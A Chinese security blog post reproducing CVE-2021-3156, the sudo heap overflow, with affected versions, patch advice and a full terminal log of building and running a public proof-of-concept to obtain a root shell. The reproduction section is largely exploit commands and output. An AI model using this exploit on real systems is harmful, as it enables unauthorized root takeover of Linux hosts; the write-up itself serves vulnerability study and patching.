![1612064108_6016256c612302f091dcb.png!small](https://image.3001.net/images/20210131/1612064108_6016256c612302f091dcb.png!small)

Linux sudo权限提升漏洞（CVE-2021-3156）复现

## 一、漏洞简介

当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或
-i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是
/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。

## 二、影响版本

Sudo 1.8.2 - 1.8.31p2

Sudo 1.9.0 - 1.9.5p1

不受影响版本

Sudo =>1.9.5p2

## 三、漏洞复现

执行获取root权限：

![1612064109_6016256d08533570f72a5.png!small](https://image.3001.net/images/20210131/1612064109_6016256d08533570f72a5.png!small)

具体操作过程：

ubuntu@VM-0-5-ubuntu:~$ git clone
https://github.91chifun.workers.dev//https://github.com/blasty/CVE-2021-3156.git

Cloning into 'CVE-2021-3156'...

warning: redirecting to
https://github.com.cnpmjs.org/blasty/CVE-2021-3156.git/

remote: Enumerating objects: 11, done.

remote: Counting objects: 100% (11/11), done.

remote: Compressing objects: 100% (9/9), done.

remote: Total 11 (delta 2), reused 11 (delta 2), pack-reused 0

Unpacking objects: 100% (11/11), done.

ubuntu@VM-0-5-ubuntu:~$ cd C

Cerberus/ CVE-2020-13942/ CVE-2020-14882_ALL/ CVE-2020-8193/ CVE-2021-3156/

ubuntu@VM-0-5-ubuntu:~$ cd CVE-2021-3156/

ubuntu@VM-0-5-ubuntu:~/CVE-2021-3156$ make

rm -rf libnss_X

mkdir libnss_X

gcc -o sudo-hax-me-a-sandwich hax.c

gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c

ubuntu@VM-0-5-ubuntu:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

usage: ./sudo-hax-me-a-sandwich <target>

available targets:

\------------------------------------------------------------
0) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31

1) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28

\------------------------------------------------------------
ubuntu@VM-0-5-ubuntu:~/CVE-2021-3156$ sudo -V

Sudo version 1.8.21p2

Sudoers policy plugin version 1.8.21p2

Sudoers file grammar version 46

Sudoers I/O plugin version 1.8.21p2

ubuntu@VM-0-5-ubuntu:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 0

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: 'Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31'

** pray for your rootshell.. **

[+] bl1ng bl1ng! We got it!

# id

uid=0(root) gid=0(root)
groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),114(sambashare),500(ubuntu)

#

exp地址：

https://github.com/blasty/CVE-2021-3156

![1612064109_6016256d633723724ecaa.png!small](https://image.3001.net/images/20210131/1612064109_6016256d633723724ecaa.png!small)

![1612064109_6016256dc097031accff0.png!small](https://image.3001.net/images/20210131/1612064109_6016256dc097031accff0.png!small)

操作步骤：

build:$make

list targets:

$./sudo-hax-me-a-sandwich

run:

$./sudo-hax-me-a-sandwich

## 四、漏洞防护

目前官方已在sudo新版本1.9.5p2中修复了该漏洞，请受影响的用户尽快升级版本进行防护，官方下载链接：

<https://www.sudo.ws/download.html>

## 参考：

https://github.com/blasty/CVE-2021-3156

https://blog.csdn.net/Vdieoo/article/details/113247603

免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![1612064110_6016256e3bc9306e31890.jpg!small](https://image.3001.net/images/20210131/1612064110_6016256e3bc9306e31890.jpg!small)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF主页：https://www.freebuf.com/author/thelostworld?type=article

![1612064110_6016256e7f68075dd5675.png!small](https://image.3001.net/images/20210131/1612064110_6016256e7f68075dd5675.png!small)

欢迎添加本公众号作者微信交流，添加时备注一下“公众号”

![1612064111_6016256f210e36cb05716.png!small](https://image.3001.net/images/20210131/1612064111_6016256f210e36cb05716.png!small)

  

